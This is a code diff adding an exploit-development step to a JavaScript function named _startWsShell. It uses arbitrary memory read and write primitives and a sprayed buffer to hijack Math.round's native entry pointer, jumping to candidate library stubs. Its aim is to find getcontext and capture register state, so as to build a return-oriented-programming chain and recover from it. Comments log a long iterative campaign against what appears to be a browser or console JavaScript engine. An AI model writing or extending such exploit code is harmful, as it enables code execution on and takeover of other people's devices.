@@ -6408,6 +6408,59 @@ function _startWsShell(){
             }
           }
 
+          /* (4c) THE STUB SWEEP (session-176: the residue-verify proved the
+          * window's popular function is NOT in the corpus-libc - a
+          * smaller foreign module. THE NEW ANGLE: the five NEVER-CALLED
+          * stubs (0xB70 0xD50 0xFF0 0x10F0 0x2E10 - not in the E2 twc
+          * death list, all 1213a-proven real raw stubs that survive
+          * arbitrary calls). IF ANY IS getcontext(421): it writes THE
+          * FULL mcontext into [RDI] - CS=0x43@+0xC0, RFLAGS@+0xF0,
+          * magic 0x480@+0x108 (the 814a layout) - the signature is
+          * unmistakable, AND the captured RSP/RIP = the rawcall's own
+          * return path = THE ROP ENTRY + RECOVERY SOLVED. The scope =
+          * MBUF+0x1000 (a 0x500 region inside the known spray buffer -
+          * never overflow the small fakeScope). RISK: an out-writer
+          * stub writes 8 bytes at [RSI=cfr] = the live frame = a
+          * bounded death-after-return; each stub beacons before it
+          * fires. The nonzero-scope readback runs after each call. */
+          try{
+            if(MBUF&&MBUF>=0x1000000000n){
+            var scopeS=MBUF+0x1000n;
+            var STUBS=[0xB70n,0xD50n,0xFF0n,0x10F0n,0x2E10n];
+            var sweep={};
+            for(var swI=0;swI<STUBS.length;swI++){
+              var sv=STUBS[swI];
+              LB('t'+swI+' stub 0x'+sv.toString(16)+' fire');
+              /* zero the scope region */
+              for(var zI=0;zI<0xA0;zI++)S.absWrite(scopeS+BigInt(zI*8),0n);
+              /* swap the scope in, rawcall the stub, restore */
+              if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,scopeS);
+              var oF=S.absRead(S.neEntry.addr+0x28n,8)[0];
+              S.absWrite(S.neEntry.addr+0x28n,lkBL+sv);
+              try{Math.round(-5.7);}catch(eSw){}
+              S.absWrite(S.neEntry.addr+0x28n,oF);
+              if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+              /* read back the nonzero words */
+              var nz={};
+              var scR=S.absRead(scopeS,0x500);
+              for(var rI=0;rI<scR.length;rI++){
+                if(scR[rI]!==0n)nz['+0x'+(rI*8).toString(16)]='0x'+scR[rI].toString(16);
+              }
+              sweep['0x'+sv.toString(16)]=nz;
+              var nzN=Object.keys(nz).length;
+              LB('t'+swI+' stub 0x'+sv.toString(16)+' nonzero='+nzN);
+              /* the getcontext signature check */
+              if(scR[0x108>>3]===0x480n&&scR[0xC0>>3]===0x43n){
+                LB('t'+swI+' *** MCONTEXT SIGNATURE at stub 0x'+sv.toString(16)+' ***');
+                reply.getcontextStub='0x'+sv.toString(16);
+                reply.capturedRsp='0x'+scR[0xF8>>3].toString(16);
+                reply.capturedRip='0x'+scR[0xE0>>3].toString(16);
+              }
+            }
+            reply.stubSweep=sweep;
+            } else LB('t sweep SKIPPED (no MBUF)');
+          }catch(eSw2){LB('t sweep fault');}
+
           /* (5) THE ORACLE */
           var RVAS9=[0x42410n,0x37BF0n,0x366E0n,0x4CDB0n,0x4C3C0n,0x4C240n,0x4C1C0n,0x4C6E0n,0x4C6F0n,0x4C650n,0xB020n,0xB070n];
           var tally9={},bestB9=0n,bestN9=0;
